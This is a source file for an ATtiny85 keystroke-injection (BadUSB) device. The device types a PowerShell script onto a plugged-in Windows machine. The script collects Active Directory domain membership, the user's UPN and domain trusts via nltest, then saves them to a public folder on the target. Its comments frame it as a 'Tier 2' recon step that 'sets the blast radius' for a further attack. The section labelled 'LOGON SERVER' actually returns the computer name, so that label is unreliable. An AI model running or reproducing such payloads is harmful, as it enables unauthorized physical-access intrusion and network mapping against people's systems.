// recon/domain - Tier 2
//
// Domain membership, DC, trusts. Sets the blast radius.
//
// (no notes)
//
// Read-only, no persistence, nothing left behind except the text file named in
// R_OUT. Output lands in C:\Users\Public\ds-recon\ on the target.

#include <duck.h>

// PROGMEM: this string must live in flash, not SRAM. The ATtiny85 has 512
// bytes of RAM and this script is far larger than that.
static const char S[] PROGMEM =
    R_MKDIR
    "$cs=Get-CimInstance Win32_ComputerSystem"
    "[pscustomobject]@{PartOfDomain=$cs.PartOfDomain;Domain=$cs.Domain;Workgroup=$cs.Workgroup;DomainRole=$cs.DomainRole}|Format-List"
    "'=== UPN ==='"
    "whoami /upn 2>&1|Out-String"
    "'=== DOMAIN TRUSTS ==='"
    "nltest /domain_trusts 2>&1|Out-String -Width 200"
    "'=== LOGON SERVER ==='"
    "(Get-CimInstance Win32_ComputerSystem).Name"
    R_OUT("domain.txt")
    R_SHOW("domain.txt");

void setup() {
  duckBegin();
  ledPulse(2, 120, 120);
  recon(S);
  ledPulse(4, 150, 150);
}

void loop() {}
